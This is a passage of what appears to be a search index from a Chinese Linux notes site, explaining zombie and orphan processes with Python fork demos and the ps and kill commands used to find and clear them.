\u5b50\u8fdb\u7a0b\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u81ea\u5df1\u5199\u7a0b\u5e8f\u7684\u8bdd\u4e00\u5b9a\u8981\u5728\u7236\u8fdb\u7a0b\u4e2d\u901a\u8fc7 wait() \u6765\u907f\u514d\u50f5\u5c38\u8fdb\u7a0b\u7684\u4ea7\u751f\u3002\u5f53\u7cfb\u7edf\u4e2d\u51fa\u73b0\u4e86\u50f5\u5c38\u8fdb\u7a0b\u65f6\uff0c\u6211\u4eec\u662f\u65e0\u6cd5\u901a\u8fc7 kill \u547d\u4ee4\u628a\u5b83\u6e05\u9664\u6389\u7684\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6740\u6b7b\u5b83\u7684\u7236\u8fdb\u7a0b\uff0c\u8ba9\u5b83\u53d8\u6210\u5b64\u513f\u8fdb\u7a0b\uff0c\u5e76\u8fdb\u4e00\u6b65\u88ab\u7cfb\u7edf\u4e2d\u7ba1\u7406\u5b64\u513f\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u6536\u517b\u5e76\u6e05\u7406\u3002 \u5982\u679c\u662f\u5bb9\u5668\u4e2d\u4ea7\u751f\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5bf9\u5bb9\u5668\u91cd\u542f\u5c31\u53ef\u4ee5\u89e3\u51b3 python\u6a21\u62df\u50f5\u5c38\u8fdb\u7a0b\u7684\u4ea7\u751f python\u4ee3\u7801\u5982\u4e0b #!/usr/bin/python # -*- coding: utf-8 -* import os,sys,time pid = os.fork() getpid = os.getpid() getppid = os.getppid() if pid == 0: print \"getpid=%d,getppid=%d,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) else: print \"getpid=%d,getppid=%d\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) time.sleep(100) \u4f7f\u7528os.fork()\u4e4b\u540e\uff0c\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u590d\u5236\u54c1\uff0c\u5728\u5185\u5b58\u4e2d\u4f1a\u628a\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u53ca\u5185\u5b58\u5206\u914d\u60c5\u51b5\u62f7\u8d1d\u4e00\u4efd\u751f\u6210\u5b50\u8fdb\u7a0b\u7684\u8fd0\u884c\u7a7a\u95f4\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u4e0e\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u4ee3\u7801\u90fd\u4e00\u6837\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u8fd0\u884c\u65f6\u72ec\u7acb\u7684\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002\u5728\u7236\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u5230\u7684pid\u662f\u5b50\u8fdb\u7a0b\u7684pid\u53f7\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u7684pid\u662f0. fork()\u51fd\u6570\u88ab\u8c03\u7528\u4e00\u6b21\uff0c\u8fd4\u56de\u4e24\u6b21\u3002\u4e24\u6b21\u8fd4\u56de\u7684\u533a\u522b\u662f\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u662f0\uff0c\u800c\u7236\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u5219\u662f\u65b0\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0bID \u5728\u6267\u884c\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u6709\u4e24\u4e2a\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u72ec\u7acb\u7684\u4ee3\u7801\u6765\u6267\u884c\uff0c\u5728\u7236\u8fdb\u7a0b\u4e2d\u6267\u884c\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u8fd4\u56de\u7684\u662f\u5b50\u8fdb\u7a0b\u7684pid\uff0c\u6240\u4ee5\u4e0d\u4f1a\u7b49\u4e8e0\uff0c\u5c31\u8d70else\u3002\u5728\u5b50\u8fdb\u7a0b\u7684\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u6267\u884c\u4e0a\u9762\u7684\u90a3\u4efd\u4ee3\u7801\uff0c\u56e0\u4e3afork\u7ed9\u5b50\u8fdb\u7a0b\u8fd4\u56de\u7684\u662f0\uff0c\u6240\u4ee5\u5c31\u8d70if\u90a3\u6761\u3002 \u7ec8\u7aef1\uff1a $ python zone.py getpid=3425,getppid=1861\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a3426 getpid=3426,getppid=3425,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a0 \u7ec8\u7aef2\uff1a $ ps -ef | grep defunct | grep -v grep root 3426 3425 0 17:02 pts/0 00:00:00 [python] <defunct> $ pstree -p systemd(1)\u2500\u252c \u251c\u2500sshd(1217)\u2500\u2500\u2500sshd(1859)\u2500\u252c\u2500bash(1861)\u2500\u2500\u2500python(3425)\u2500\u2500\u2500python(3426) \u2502 \u2514\u2500bash(2828)\u2500\u2500\u2500pstree(3439) $ kill -s SIGCHLD 3425 #\u901a\u77e5\u7236\u8fdb\u7a0b\u56de\u6536\u50f5\u5c38\uff0c\u4f46\u662f\u65e0\u6548\uff0c\u56e0\u4e3a\u7236\u8fdb\u7a0b\u5728\u7761\u7720 $ ps -ef | grep defunct | grep -v grep root 3426 3425 0 17:02 pts/0 00:00:00 [python] <defunct> $ kill -9 3425 #\u6740\u6b7b\u50f5\u5c38\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u53d8\u6210\u5b64\u513f\u8fdb\u7a0b\u4ece\u800c\u88ab\u56de\u6536 $ ps -ef | grep defunct | grep -v grep #\u50f5\u5c38\u8fdb\u7a0b\u6d88\u5931 \u5b50\u8fdb\u7a0b\u6210\u4e86\u50f5\u5c38\u8fdb\u7a0b\u662f\u56e0\u4e3a\u5b50\u8fdb\u7a0b\u7ed3\u675f\u7684\u65f6\u5019\uff0c\u7236\u8fdb\u7a0b\u8fd8\u5728\u7761\u89c9\uff0c\u4e0d\u80fd\u8c03\u7528wait()\u6216waitpid()\u53bb\u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684\u7ec8\u6b62\u72b6\u6001\uff0c\u4f46\u662f\u7b49\u7236\u8fdb\u7a0b\u9192\u6765\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u628a\u50f5\u5c38\u8fdb\u7a0b\u7ed9\u5904\u7406\u6389","title":"\u50f5\u5c38\u8fdb\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/#_1","text":"","title":"\u50f5\u5c38\u8fdb\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/#_2","text":"\u50f5\u5c38\u8fdb\u7a0b\uff0c\u8fd9\u662f\u591a\u8fdb\u7a0b\u5e94\u7528\u5f88\u5bb9\u6613\u78b0\u5230\u7684\u95ee\u9898\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\u540e\uff0c\u5b83\u5e94\u8be5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 wait() \u6216\u8005 waitpid() \u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\uff0c\u56de\u6536\u5b50\u8fdb\u7a0b\u7684\u8d44\u6e90\uff1b\u800c\u5b50\u8fdb\u7a0b\u5728\u7ed3\u675f\u65f6\uff0c\u4f1a\u5411\u5b83\u7684\u7236\u8fdb\u7a0b\u53d1\u9001 SIGCHLD \u4fe1\u53f7\uff0c\u6240\u4ee5\uff0c\u7236\u8fdb\u7a0b\u8fd8\u53ef\u4ee5\u6ce8\u518c SIGCHLD \u4fe1\u53f7\u7684\u5904\u7406\u51fd\u6570\uff0c\u5f02\u6b65\u56de\u6536\u8d44\u6e90\u3002\u5982\u679c\u7236\u8fdb\u7a0b\u6ca1\u8fd9\u4e48\u505a\uff0c\u6216\u662f\u5b50\u8fdb\u7a0b\u6267\u884c\u592a\u5feb\uff0c\u7236\u8fdb\u7a0b\u8fd8\u6ca1\u6765\u5f97\u53ca\u5904\u7406\u5b50\u8fdb\u7a0b\u72b6\u6001\uff0c\u5b50\u8fdb\u7a0b\u5c31\u5df2\u7ecf\u63d0\u524d\u9000\u51fa\uff0c\u90a3\u8fd9\u65f6\u7684\u5b50\u8fdb\u7a0b\u5c31\u4f1a\u53d8\u6210\u50f5\u5c38\u8fdb\u7a0b\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u7236\u4eb2\u5e94\u8be5\u4e00\u76f4\u5bf9\u513f\u5b50\u8d1f\u8d23\uff0c\u5584\u59cb\u5584\u7ec8\uff0c\u5982\u679c\u4e0d\u4f5c\u4e3a\u6216\u8005\u8ddf\u4e0d\u4e0a\uff0c\u90fd\u4f1a\u5bfc\u81f4\u201c\u95ee\u9898\u5c11\u5e74\u201d\u7684\u51fa\u73b0\u3002","title":"\u4ea7\u751f\u539f\u56e0"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/#_3","text":"\u4e00\u65e6\u7236\u8fdb\u7a0b\u6ca1\u6709\u5904\u7406\u5b50\u8fdb\u7a0b\u7684\u7ec8\u6b62\uff0c\u8fd8\u4e00\u76f4\u4fdd\u6301\u8fd0\u884c\u72b6\u6001\uff0c\u90a3\u4e48\u5b50\u8fdb\u7a0b\u5c31\u4f1a\u4e00\u76f4\u5904\u4e8e\u50f5\u5c38\u72b6\u6001\u3002\u5927\u91cf\u7684\u50f5\u5c38\u8fdb\u7a0b\u4f1a\u7528\u5c3d PID \u8fdb\u7a0b\u53f7\uff0c\u5bfc\u81f4\u65b0\u8fdb\u7a0b\u4e0d\u80fd\u521b\u5efa\uff0c\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u4e00\u5b9a\u8981\u907f\u514d\u3002","title":"\u50f5\u5c38\u8fdb\u7a0b\u7684\u5f71\u54cd"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/#_4","text":"$ ps aux | grep Z #\u6216\u8005 $ ps -ef | grep defunct | grep -v grep","title":"\u67e5\u627e\u50f5\u5c38\u8fdb\u7a0b\u7684\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/#_5","text":"\u4fe1\u53f7\u6765\u6740\u6b7b\u8fdb\u7a0b\uff0c\u4f46\u662f\u50f5\u5c38\u8fdb\u7a0b\u5df2\u7ecf\u6b7b\u4e86\uff0c \u4f60\u4e0d\u80fd\u6740\u6b7b\u5df2\u7ecf\u6b7b\u6389\u7684\u4e1c\u897f\u3002 \u56e0\u6b64\u4f60\u9700\u8981\u8f93\u5165\u7684\u547d\u4ee4\u5e94\u8be5\u662f kill -s SIGCHLD pid # \u5c06\u8fd9\u91cc\u7684 pid \u66ff\u6362\u6210\u7236\u8fdb\u7a0b\u7684\u8fdb\u7a0b id\uff0c\u8fd9\u6837\u7236\u8fdb\u7a0b\u5c31\u4f1a\u5220\u9664\u6240\u6709\u4ee5\u53ca\u5b8c\u6210\u5e76\u6b7b\u6389\u7684\u5b50\u8fdb\u7a0b\u4e86\u3002\u6709\u65f6\u8fd9\u6837\u662f\u5220\u9664\u4e0d\u6389\u50f5\u5c38\u8fdb\u7a0b \u50f5\u5c38\u8fdb\u7a0b\u7684\u4ea7\u751f\u662f\u56e0\u4e3a\u7236\u8fdb\u7a0b\u6ca1\u6709 wait() \u5b50\u8fdb\u7a0b\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u81ea\u5df1\u5199\u7a0b\u5e8f\u7684\u8bdd\u4e00\u5b9a\u8981\u5728\u7236\u8fdb\u7a0b\u4e2d\u901a\u8fc7 wait() \u6765\u907f\u514d\u50f5\u5c38\u8fdb\u7a0b\u7684\u4ea7\u751f\u3002\u5f53\u7cfb\u7edf\u4e2d\u51fa\u73b0\u4e86\u50f5\u5c38\u8fdb\u7a0b\u65f6\uff0c\u6211\u4eec\u662f\u65e0\u6cd5\u901a\u8fc7 kill \u547d\u4ee4\u628a\u5b83\u6e05\u9664\u6389\u7684\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6740\u6b7b\u5b83\u7684\u7236\u8fdb\u7a0b\uff0c\u8ba9\u5b83\u53d8\u6210\u5b64\u513f\u8fdb\u7a0b\uff0c\u5e76\u8fdb\u4e00\u6b65\u88ab\u7cfb\u7edf\u4e2d\u7ba1\u7406\u5b64\u513f\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u6536\u517b\u5e76\u6e05\u7406\u3002 \u5982\u679c\u662f\u5bb9\u5668\u4e2d\u4ea7\u751f\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5bf9\u5bb9\u5668\u91cd\u542f\u5c31\u53ef\u4ee5\u89e3\u51b3","title":"\u5982\u4f55\u5904\u7406\u50f5\u5c38\u8fdb\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/#python","text":"python\u4ee3\u7801\u5982\u4e0b #!/usr/bin/python # -*- coding: utf-8 -* import os,sys,time pid = os.fork() getpid = os.getpid() getppid = os.getppid() if pid == 0: print \"getpid=%d,getppid=%d,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) else: print \"getpid=%d,getppid=%d\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) time.sleep(100) \u4f7f\u7528os.fork()\u4e4b\u540e\uff0c\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u590d\u5236\u54c1\uff0c\u5728\u5185\u5b58\u4e2d\u4f1a\u628a\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u53ca\u5185\u5b58\u5206\u914d\u60c5\u51b5\u62f7\u8d1d\u4e00\u4efd\u751f\u6210\u5b50\u8fdb\u7a0b\u7684\u8fd0\u884c\u7a7a\u95f4\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u4e0e\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u4ee3\u7801\u90fd\u4e00\u6837\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u8fd0\u884c\u65f6\u72ec\u7acb\u7684\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002\u5728\u7236\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u5230\u7684pid\u662f\u5b50\u8fdb\u7a0b\u7684pid\u53f7\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u7684pid\u662f0. fork()\u51fd\u6570\u88ab\u8c03\u7528\u4e00\u6b21\uff0c\u8fd4\u56de\u4e24\u6b21\u3002\u4e24\u6b21\u8fd4\u56de\u7684\u533a\u522b\u662f\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u662f0\uff0c\u800c\u7236\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u5219\u662f\u65b0\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0bID \u5728\u6267\u884c\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u6709\u4e24\u4e2a\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u72ec\u7acb\u7684\u4ee3\u7801\u6765\u6267\u884c\uff0c\u5728\u7236\u8fdb\u7a0b\u4e2d\u6267\u884c\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u8fd4\u56de\u7684\u662f\u5b50\u8fdb\u7a0b\u7684pid\uff0c\u6240\u4ee5\u4e0d\u4f1a\u7b49\u4e8e0\uff0c\u5c31\u8d70else\u3002\u5728\u5b50\u8fdb\u7a0b\u7684\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u6267\u884c\u4e0a\u9762\u7684\u90a3\u4efd\u4ee3\u7801\uff0c\u56e0\u4e3afork\u7ed9\u5b50\u8fdb\u7a0b\u8fd4\u56de\u7684\u662f0\uff0c\u6240\u4ee5\u5c31\u8d70if\u90a3\u6761\u3002 \u7ec8\u7aef1\uff1a $ python zone.py getpid=3425,getppid=1861\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a3426 getpid=3426,getppid=3425,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a0 \u7ec8\u7aef2\uff1a $ ps -ef | grep defunct | grep -v grep root 3426 3425 0 17:02 pts/0 00:00:00 [python] <defunct> $ pstree -p systemd(1)\u2500\u252c \u251c\u2500sshd(1217)\u2500\u2500\u2500sshd(1859)\u2500\u252c\u2500bash(1861)\u2500\u2500\u2500python(3425)\u2500\u2500\u2500python(3426) \u2502 \u2514\u2500bash(2828)\u2500\u2500\u2500pstree(3439) $ kill -s SIGCHLD 3425 #\u901a\u77e5\u7236\u8fdb\u7a0b\u56de\u6536\u50f5\u5c38\uff0c\u4f46\u662f\u65e0\u6548\uff0c\u56e0\u4e3a\u7236\u8fdb\u7a0b\u5728\u7761\u7720 $ ps -ef | grep defunct | grep -v grep root 3426 3425 0 17:02 pts/0 00:00:00 [python] <defunct> $ kill -9 3425 #\u6740\u6b7b\u50f5\u5c38\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u53d8\u6210\u5b64\u513f\u8fdb\u7a0b\u4ece\u800c\u88ab\u56de\u6536 $ ps -ef | grep defunct | grep -v grep #\u50f5\u5c38\u8fdb\u7a0b\u6d88\u5931 \u5b50\u8fdb\u7a0b\u6210\u4e86\u50f5\u5c38\u8fdb\u7a0b\u662f\u56e0\u4e3a\u5b50\u8fdb\u7a0b\u7ed3\u675f\u7684\u65f6\u5019\uff0c\u7236\u8fdb\u7a0b\u8fd8\u5728\u7761\u89c9\uff0c\u4e0d\u80fd\u8c03\u7528wait()\u6216waitpid()\u53bb\u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684\u7ec8\u6b62\u72b6\u6001\uff0c\u4f46\u662f\u7b49\u7236\u8fdb\u7a0b\u9192\u6765\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u628a\u50f5\u5c38\u8fdb\u7a0b\u7ed9\u5904\u7406\u6389","title":"python\u6a21\u62df\u50f5\u5c38\u8fdb\u7a0b\u7684\u4ea7\u751f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/","text":"\u5b64\u513f\u8fdb\u7a0b \u200b \u5b64\u513f\u8fdb\u7a0b\u6307\uff1a\u5f53\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\u7ed3\u675f\u65f6\uff0c\u5b50\u8fdb\u7a0b\u8fd8\u5728\u8fd0\u884c\uff0c\u6b64\u65f6\uff0c\u8fd9\u4e2a\u5b50\u8fdb\u7a0b\u5c31\u53eb\u505a\u5b64\u513f\u8fdb\u7a0b\u3002\u6700\u540e\uff0c\u5b64\u513f\u8fdb\u7a0b\u4f1a\u88abinit\u8fdb\u7a0b(\u8fdb\u7a0bid\u4e3a1)\u8fdb\u7a0b\u6536\u517b\uff0c\u5373\u5c06init\u4f5c\u4e3a\u5b64\u513f\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\uff0c\u5f53\u5b50\u8fdb\u7a0b\u7ed3\u675f\u65f6\uff0c\u7531init\u8fdb\u7a0b\u5b8c\u6210\u5bf9\u5b83\u7684\u72b6\u6001\u6536\u96c6\u5de5\u4f5c\u3002\u56e0\u6b64\uff0c\u5b64\u513f\u8fdb\u7a0b\u662f\u65e0\u5bb3\u7684\u3002 Python\u6a21\u62df\u5b64\u513f\u8fdb\u7a0b\u4ea7\u751f #!/usr/bin/python # -*- coding: utf-8 -* import os,sys,time pid = os.fork() getpid = os.getpid() getppid = os.getppid() if pid == 0: time.sleep(2) print \"getpid=%d,getppid=%d,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) else: print \"getpid=%d,getppid=%d\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) \u4f7f\u7528os.fork()\u4e4b\u540e\uff0c\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u590d\u5236\u54c1\uff0c\u5728\u5185\u5b58\u4e2d\u4f1a\u628a\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u53ca\u5185\u5b58\u5206\u914d\u60c5\u51b5\u62f7\u8d1d\u4e00\u4efd\u751f\u6210\u5b50\u8fdb\u7a0b\u7684\u8fd0\u884c\u7a7a\u95f4\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u4e0e\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u4ee3\u7801\u90fd\u4e00\u6837\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u8fd0\u884c\u65f6\u72ec\u7acb\u7684\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002\u5728\u7236\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u5230\u7684pid\u662f\u5b50\u8fdb\u7a0b\u7684pid\u53f7\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u7684pid\u662f0. fork()\u51fd\u6570\u88ab\u8c03\u7528\u4e00\u6b21\uff0c\u8fd4\u56de\u4e24\u6b21\u3002\u4e24\u6b21\u8fd4\u56de\u7684\u533a\u522b\u662f\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u662f0\uff0c\u800c\u7236\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u5219\u662f\u65b0\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0bID \u5728\u6267\u884c\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u6709\u4e24\u4e2a\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u72ec\u7acb\u7684\u4ee3\u7801\u6765\u6267\u884c\uff0c\u5728\u7236\u8fdb\u7a0b\u4e2d\u6267\u884c\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u8fd4\u56de\u7684\u662f\u5b50\u8fdb\u7a0b\u7684pid\uff0c\u6240\u4ee5\u4e0d\u4f1a\u7b49\u4e8e0\uff0c\u5c31\u8d70else\u3002\u5728\u5b50\u8fdb\u7a0b\u7684\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u6267\u884c\u4e0a\u9762\u7684\u90a3\u4efd\u4ee3\u7801\uff0c\u56e0\u4e3afork\u7ed9\u5b50\u8fdb\u7a0b\u8fd4\u56de\u7684\u662f0\uff0c\u6240\u4ee5\u5c31\u8d70if\u90a3\u6761\u3002 \u8ba9\u7236\u8fdb\u7a0b\u5148\u6267\u884c\u5b8c\uff0c\u540e\u6267\u884c\u7684\u5b50\u8fdb\u7a0b\uff0c\u8fd9\u5c31\u610f\u5473\u7740\uff0c\u5b50\u8fdb\u7a0b\u6267\u884c\u5b8c\u4e86\u7684\u65f6\u5019\uff0c\u7236\u8fdb\u7a0b\u5df2\u7ecf\u4e0d\u5728\u4e86\uff0c\u5c31\u6210\u4e86\u5b64\u513f\u8fdb\u7a0b\uff0c\u5b64\u513f\u8fdb\u7a0b\u6700\u7ec8\u4f1a\u7531init\uff0c\u4e5f\u5c31\u662f\u8fdb\u7a0b1\u6536\u517b\uff0c\u628a\u5b83\u6740\u6389 #\u9700\u8981\u591a\u6267\u884c\u51e0\u6b21\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e0b\u9762\u7684\u60c5\u51b5 $ python zone.py getpid=3675,getppid=1861\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a3676 getpid=3676,getppid=1,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a0 #ppid\u5df2\u7ecf\u4e3a1\uff0c\u88ab\u8fdb\u7a0b1\u6536\u517b","title":"\u5b64\u513f\u8fdb\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/#_1","text":"\u200b \u5b64\u513f\u8fdb\u7a0b\u6307\uff1a\u5f53\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\u7ed3\u675f\u65f6\uff0c\u5b50\u8fdb\u7a0b\u8fd8\u5728\u8fd0\u884c\uff0c\u6b64\u65f6\uff0c\u8fd9\u4e2a\u5b50\u8fdb\u7a0b\u5c31\u53eb\u505a\u5b64\u513f\u8fdb\u7a0b\u3002\u6700\u540e\uff0c\u5b64\u513f\u8fdb\u7a0b\u4f1a\u88abinit\u8fdb\u7a0b(\u8fdb\u7a0bid\u4e3a1)\u8fdb\u7a0b\u6536\u517b\uff0c\u5373\u5c06init\u4f5c\u4e3a\u5b64\u513f\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\uff0c\u5f53\u5b50\u8fdb\u7a0b\u7ed3\u675f\u65f6\uff0c\u7531init\u8fdb\u7a0b\u5b8c\u6210\u5bf9\u5b83\u7684\u72b6\u6001\u6536\u96c6\u5de5\u4f5c\u3002\u56e0\u6b64\uff0c\u5b64\u513f\u8fdb\u7a0b\u662f\u65e0\u5bb3\u7684\u3002","title":"\u5b64\u513f\u8fdb\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/#python","text":"#!/usr/bin/python # -*- coding: utf-8 -* import os,sys,time pid = os.fork() getpid = os.getpid() getppid = os.getppid() if pid == 0: time.sleep(2) print \"getpid=%d,getppid=%d,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) else: print \"getpid=%d,getppid=%d\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a%d\" %(getpid,getppid,pid) \u4f7f\u7528os.fork()\u4e4b\u540e\uff0c\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u590d\u5236\u54c1\uff0c\u5728\u5185\u5b58\u4e2d\u4f1a\u628a\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u53ca\u5185\u5b58\u5206\u914d\u60c5\u51b5\u62f7\u8d1d\u4e00\u4efd\u751f\u6210\u5b50\u8fdb\u7a0b\u7684\u8fd0\u884c\u7a7a\u95f4\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u4e0e\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u4ee3\u7801\u90fd\u4e00\u6837\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u8fd0\u884c\u65f6\u72ec\u7acb\u7684\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002\u5728\u7236\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u5230\u7684pid\u662f\u5b50\u8fdb\u7a0b\u7684pid\u53f7\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u83b7\u53d6\u7684pid\u662f0. fork()\u51fd\u6570\u88ab\u8c03\u7528\u4e00\u6b21\uff0c\u8fd4\u56de\u4e24\u6b21\u3002\u4e24\u6b21\u8fd4\u56de\u7684\u533a\u522b\u662f\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u662f0\uff0c\u800c\u7236\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u5219\u662f\u65b0\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0bID 